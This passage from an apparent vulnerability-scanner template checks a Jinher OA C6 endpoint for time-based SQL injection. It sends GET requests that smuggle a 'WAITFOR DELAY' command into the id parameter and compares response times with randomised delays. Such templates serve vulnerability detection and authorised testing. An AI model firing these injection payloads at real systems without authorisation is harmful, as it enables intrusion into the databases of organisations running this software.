  t2: t1 + 2
  t3: random_int(5,9)
  t4: t3 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:{{.t1}}%27--+
  expression: "status_code == 200 && \nduration >= t1 &&\nduration <= t2 &&\ntrim(body)\
    \ == \"\"\n"
- method: GET
  path: /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:{{.t3}}%27--+
